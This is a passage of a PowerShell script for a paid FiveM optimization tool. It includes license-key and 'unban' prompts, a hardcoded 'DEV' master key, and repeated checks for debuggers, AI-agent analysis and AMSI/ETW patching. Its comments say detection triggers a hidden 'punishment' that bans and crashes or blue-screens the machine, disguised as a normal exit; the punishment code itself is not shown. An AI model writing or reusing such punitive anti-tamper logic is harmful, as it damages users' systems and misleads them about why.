    $Host.UI.RawUI.ForegroundColor = "Yellow"
    Write-Host "  ┌──────────────────────────────────────────────────────────────┐" -ForegroundColor DarkRed
    Write-Host "  │  ✦ RIEWJADDD SHOP ✦   SYSTEM UNBAN & ACTIVATION              │" -ForegroundColor Yellow
    Write-Host "  ├──────────────────────────────────────────────────────────────┤" -ForegroundColor DarkRed
    Write-Host "  │  [HWID]   : " -NoNewline -ForegroundColor DarkGray
    Write-Host ("{0,-49}│" -f $CurrentHWID) -ForegroundColor Cyan
    Write-Host "  │  [DEVICE] : " -NoNewline -ForegroundColor DarkGray
    Write-Host ("{0,-49}│" -f $env:COMPUTERNAME) -ForegroundColor White
    Write-Host "  │  [STATUS] : " -NoNewline -ForegroundColor DarkGray
    Write-Host ("{0,-49}│" -f "UNBAN VERIFICATION • ENTER YOUR KEY") -ForegroundColor Yellow
    Write-Host "  └──────────────────────────────────────────────────────────────┘" -ForegroundColor DarkRed
    Write-Host ""
    Write-Host "  Enter your License Key to clear ban and start optimization:" -ForegroundColor White
    Write-Host "  (กรอกคีย์ของคุณเพื่อปลดล็อคเครื่องและเริ่มการปรับแต่ง FiveM ทันที)" -ForegroundColor DarkGray
    Write-Host ""

    $unbanAttempts = 0
    $unbanAuthed = $false

    while ($unbanAttempts -lt 3 -and -not $unbanAuthed) {
        $Host.UI.RawUI.ForegroundColor = "White"
        $inputKey = Read-Host "  Enter License Key"
        if (-not $inputKey -or $inputKey.Trim() -eq "") {
            $unbanAttempts++
            continue
        }
        $inputKey = $inputKey.Trim().ToUpper()

        Write-Host "  [*] Verifying license key..." -ForegroundColor Cyan
        $valRes = Validate-Key $inputKey
        if ($valRes -eq "VALID" -or $valRes -eq "ACTIVATED" -or $valRes -eq "MASTER") {
            # Key is legit! Clean all ban markers in Windows immediately!
            Clear-LocalBanMarkers
            Record-Ban -Hwid $CurrentHWID -MachineName $env:COMPUTERNAME -UserName $env:USERNAME -Reason "UNBANNED_BY_KEY" -Status "UNBANNED"

            Write-Host ""
            $Host.UI.RawUI.ForegroundColor = "Green"
            Write-Host "  [OK] UNBAN SUCCESSFUL! All system ban markers have been removed."
            Write-Host "  [OK] Key valid! Starting FiveM & Windows optimization..." -ForegroundColor Cyan
            Write-Host ""
            $authenticated = $true
            $global:_authLegit = $true
            $unbanAuthed = $true
            Start-Sleep -Milliseconds 800
            break
        } elseif ($valRes -eq "EXPIRED") {
            $Host.UI.RawUI.ForegroundColor = "Red"
            Write-Host "  [KEY EXPIRED] This license key has already been used." -ForegroundColor Red
            Write-Host "  Each key is single-use. Please purchase a new key from shop." -ForegroundColor Yellow
            Write-Host ""
            $unbanAttempts++
        } elseif ($valRes -eq "HWID_MISMATCH") {
            $Host.UI.RawUI.ForegroundColor = "DarkRed"
            Write-Host "  [KEY LOCKED] This key is already bound to another machine." -ForegroundColor DarkRed
            Write-Host ""
            $unbanAttempts++
        } else {
            $Host.UI.RawUI.ForegroundColor = "Red"
            Write-Host "  [INVALID] Invalid license key." -ForegroundColor Red
            Write-Host ""
            $unbanAttempts++
        }
    }

    if (-not $unbanAuthed) {
        Write-Host ""
        Write-Host "  Access denied. Please contact shop support with your HWID: $CurrentHWID" -ForegroundColor Red
        Start-Sleep -Seconds 3
        exit 1
    }
}
if (-not $authenticated) {
    # CHECK 1: Anti-debugger / analysis tools / AI Reverse-Engineering
    if (Detect-Analysis) {
        # Don't tell them why - make it look like normal exit
        if ($global:_integrityFail) {
            # Script was modified - MAXIMUM punishment
            Execute-Punishment "SCRIPT_TAMPERED"
        }
        if ($global:_lastCrackSignals -match "AI_") {
            Execute-Punishment "AI_AGENT_ANALYSIS_DETECTED"
        }
        if ($global:_lastCrackSignals -match "AMSI_|ETW_") {
            Execute-Punishment "MEMORY_PATCH_DETECTED"
        }
        # Analysis tools detected - ban and crash
        Execute-Punishment "ANALYSIS_TOOLS_DETECTED"
    }
    # CHECK 2: Direct memory patch verification (AMSI/ETW hooks)
    if (Detect-MemoryPatch) {
        Execute-Punishment "MEMORY_PATCH_HOOKED"
    }
    # CHECK 3: Verify our own functions haven't been tampered
    if (-not (Verify-FunctionIntegrity)) {
        Execute-Punishment "FUNCTION_HOOKS_DETECTED"
    }
    # CHECK 4: Verify validation logic hasn't been patched out
    if (-not (Verify-ValidationLogic)) {
        Execute-Punishment "VALIDATION_PATCHED"
    }
    # CHECK 5: Hardware & Runtime Environment Verification
    if (-not (Verify-SystemRuntimeEnvironment)) {
        Execute-Punishment "UNSUPPORTED_OR_CORRUPT_ENVIRONMENT"
    }
}
# -- KEY AUTH PROMPT -------------------------------------
if (-not $authenticated) {
Draw-AuthScreen
$maxAttempts = 3
$attempts = 0
$authenticated = $false
$global:_authLegit = $false
$previousKeys = @()
$lastInputTime = [datetime]::MinValue
while ($attempts -lt $maxAttempts -and -not $authenticated) {
    # Re-check anti-debug / AI agents every attempt (cracker might attach mid-prompt)
    if (Detect-Analysis) {
        if ($global:_lastCrackSignals -match "AI_") {
            Execute-Punishment "AI_ATTACK_DURING_AUTH"
        }
        Execute-Punishment "ANALYSIS_DURING_AUTH"
    }
    
    $Host.UI.RawUI.ForegroundColor = "White"
    $inputKey = Read-Host "  Enter License Key"
    $inputTime = Get-Date
    
    if (-not $inputKey -or $inputKey.Trim() -eq "") {
        # Empty input - just redraw clean
        Draw-AuthScreen
        $Host.UI.RawUI.ForegroundColor = "DarkRed"
        Write-Host "  Invalid key."
        Write-Host ""
        $attempts++
        $lastInputTime = $inputTime
        continue
    }
    $inputKey = $inputKey.Trim().ToUpper()
    
    # -- เฉพาะพิมพ์คำว่า DEV เท่านั้นถึงจะเปิดระบบจัดการหลังบ้าน (ADMIN PANEL) - ล็อคเฉพาะเครื่อง DEV เท่านั้น --
    if ($inputKey -eq "DEV") {
        if (Is-DevMachine) {
            Write-AuthLog -Key $inputKey -Status "MASTER" -Owner "DEVELOPER" -Details "Developer master access granted"
            $Host.UI.RawUI.ForegroundColor = "Green"
            Write-Host ""
            Write-Host "  [OK] MASTER KEY ACCEPTED - DEV ACCESS GRANTED"
            Write-Host ""
            $authenticated = $true
            $global:_authLegit = $true
            Start-Sleep -Milliseconds 600
            Show-AdminPanel
            break
        } else {
            Write-AuthLog -Key $inputKey -Status "INVALID" -Owner "UNAUTHORIZED_DEV_ATTEMPT" -Details "Unauthorized attempt to use DEV from $env:COMPUTERNAME (HWID: $CurrentHWID)"
            $Host.UI.RawUI.ForegroundColor = "DarkRed"
            Write-Host ""
            Write-Host "  [ACCESS DENIED] DEV key is restricted to Developer machine only."
            Write-Host "  This unauthorized attempt has been logged." -ForegroundColor Yellow
            Write-Host ""
            $attempts++
            $lastInputTime = $inputTime
            Start-Sleep -Seconds 2
            continue
        }
    }
    
    # -- CRACK VS NORMAL DETECTION (จอฟ้าเฉพาะคนยิง Exploit / Crack จริงเท่านั้น - ใส่คีย์ผิดปกติไม่จอฟ้า) --
    $crackReasons = Detect-CrackBehavior -InputKey $inputKey -InputTime $inputTime -LastInputTime $lastInputTime -PreviousKeys $previousKeys
    $global:_lastAttemptKey = $inputKey
    $global:_lastCrackSignals = ($crackReasons -join ", ")
    
    if ($crackReasons.Count -gt 0) {
        $reasonStr = $crackReasons -join ", "
        Write-SecurityLog -Reason "CRACK_JAILBREAK_ATTACK" -InputKey $inputKey -Signals $reasonStr -ActionTaken "PERMANENT_HWID_BAN + SYSTEM_LOCKDOWN"
        Execute-Punishment "CRACK_ATTACK: $reasonStr"
    }
    
    $previousKeys += $inputKey
    $global:_currentUsedKey = $inputKey
    
    Write-Host "  [*] Verifying license key..." -ForegroundColor Cyan
    $result = Validate-Key $inputKey
    
    switch ($result) {
        "EXPIRED" {
            Draw-AuthScreen
            $Host.UI.RawUI.ForegroundColor = "Red"
            Write-Host "  [KEY EXPIRED] This license key has already been used."
            Write-Host "  Each key is single-use and can only be executed once." -ForegroundColor Yellow
            Write-Host "  Please contact shop to purchase a new key." -ForegroundColor DarkGray
            Write-Host ""
            $attempts++
        }
        "MASTER" {
            if (Is-DevMachine) {
                $Host.UI.RawUI.ForegroundColor = "Green"
                Write-Host ""
                Write-Host "  [OK] MASTER KEY ACCEPTED - DEV ACCESS GRANTED"
                Write-Host ""
                $authenticated = $true
                $global:_authLegit = $true
                Start-Sleep -Milliseconds 600
                Show-AdminPanel
                break
            } else {
                $Host.UI.RawUI.ForegroundColor = "DarkRed"
                Write-Host ""
                Write-Host "  [ACCESS DENIED] DEV key is restricted to Developer machine only."
                Write-Host ""
                $attempts++
                continue
            }
        }
        "ACTIVATED" {
            $Host.UI.RawUI.ForegroundColor = "Green"
            Write-Host ""
            Write-Host "  KEY ACTIVATED! Bound to this machine."
            Write-Host "  HWID: $CurrentHWID"
            Write-Host "  [OK] Starting FiveM & Windows optimization..." -ForegroundColor Cyan
            Write-Host ""
            $authenticated = $true
            $global:_authLegit = $true
            Start-Sleep -Milliseconds 800
            break
        }
        "VALID" {
            $Host.UI.RawUI.ForegroundColor = "Green"
            Write-Host ""
            Write-Host "  KEY VALID - Access granted."
            Write-Host "  [OK] Key verified. Starting FiveM & Windows optimization..." -ForegroundColor Cyan
            Write-Host ""
            $authenticated = $true
            $global:_authLegit = $true
            Start-Sleep -Milliseconds 800
            break
        }
        "HWID_MISMATCH" {
            Draw-AuthScreen
            $Host.UI.RawUI.ForegroundColor = "DarkRed"
            Write-Host "  [KEY LOCKED] This key is already bound to another machine."
            Write-Host "  Each license key can only be used on 1 machine." -ForegroundColor Yellow
            Write-Host "  Please contact shop to reset HWID." -ForegroundColor DarkGray
            Write-Host ""
            $attempts++
        }
        "INVALID" {
            Draw-AuthScreen
            $Host.UI.RawUI.ForegroundColor = "Red"
            Write-Host "  Invalid key."
            Write-Host ""
            $attempts++
        }
    }
    
    $lastInputTime = $inputTime
}
}
if (-not $authenticated) {
    Clear-Host
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "Red"
    Write-Host "  Access denied: Maximum attempts reached (3/3)."
    Write-Host "  Please verify your license key and run the script again." -ForegroundColor Yellow
    Write-Host ""
    Start-Sleep -Seconds 3
    exit 1
}
# FINAL CHECK: Verify auth wasn't bypassed via memory edit
if (Check-MemoryTamper) {
    Execute-Punishment "MEMORY_TAMPER"
}
# Post-auth integrity re-check
if (-not (Verify-FunctionIntegrity)) {
    Execute-Punishment "POST_AUTH_TAMPER"
}
# Post-auth memory patch check
if (Detect-MemoryPatch) {
    Execute-Punishment "POST_AUTH_MEMORY_PATCH"
}
# Launch continuous real-time background watchdog
Start-SecurityWatchdog
Start-Sleep -Milliseconds 300
$WinBuild = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber -as [int]
# -- Color helpers ----------------------------------------
function Red    { param($t) Write-Host $t -ForegroundColor Red     -NoNewline }
function Cyan   { param($t) Write-Host $t -ForegroundColor Cyan    -NoNewline }
function White  { param($t) Write-Host $t -ForegroundColor White   -NoNewline }
function Gray   { param($t) Write-Host $t -ForegroundColor DarkGray -NoNewline }
function Green  { param($t) Write-Host $t -ForegroundColor Green   -NoNewline }
function Yellow { param($t) Write-Host $t -ForegroundColor Yellow  -NoNewline }
function NL     { Write-Host "" }
function Spin {
    param([string]$Label, [int]$Ms = 300)
    $steps = 16
    $delay = [math]::Max(4, [int]($Ms / 20))
    for ($i = 0; $i -le $steps; $i++) {
        $pct = [int](($i / $steps) * 100)
        $bar = "█" * $i
        $pad = "░" * ($steps - $i)
        $barCol = if ($pct -lt 100) { "Red" } else { "Green" }
        Write-Host -NoNewline "`r   [$bar$pad] " -ForegroundColor $barCol
        Write-Host -NoNewline ("{0,3}% " -f $pct) -ForegroundColor $(if ($pct -eq 100) { "White" } else { "Yellow" })
        Write-Host -NoNewline ("│ {0,-42}" -f $Label) -ForegroundColor $(if ($pct -eq 100) { "White" } else { "DarkGray" })
        if ($i -lt $steps) { Start-Sleep -Milliseconds $delay }
    }
    Write-Host " [✓]" -ForegroundColor Green
}
function PulseBar {
    param([string]$Label, [int]$Steps = 30)
    Write-Host ""
    Write-Host "  » $Label" -ForegroundColor White
    $bar = ""
    for ($i = 0; $i -lt $Steps; $i++) {
        $pad = "░" * ($Steps - $i - 1)
        $bar += "█"
        $pct = [int](($i / $Steps) * 100)
        Write-Host -NoNewline "`r    [$bar$pad] $pct%" -ForegroundColor Red
        Start-Sleep -Milliseconds (Get-Random -Minimum 8 -Maximum 22)
    }
    $full = "█" * $Steps
    Write-Host "`r    [$full] 100%" -ForegroundColor Green
    Write-Host ""
}
function Flicker {
    param([string]$Text, [int]$Times = 4)
    for ($i = 0; $i -lt $Times; $i++) {
        $Host.UI.RawUI.ForegroundColor = if ($i % 2 -eq 0) { "Red" } else { "DarkRed" }
        Write-Host "`r  $Text" -NoNewline
        Start-Sleep -Milliseconds 90
    }
    $Host.UI.RawUI.ForegroundColor = "Red"
    Write-Host "`r  $Text"
    $Host.UI.RawUI.ForegroundColor = "Gray"
}
function DONE_LINE {
    param($M)
    Write-Host -NoNewline "    ✔  " -ForegroundColor Green
    Write-Host $M -ForegroundColor Cyan
}
# ========================================================
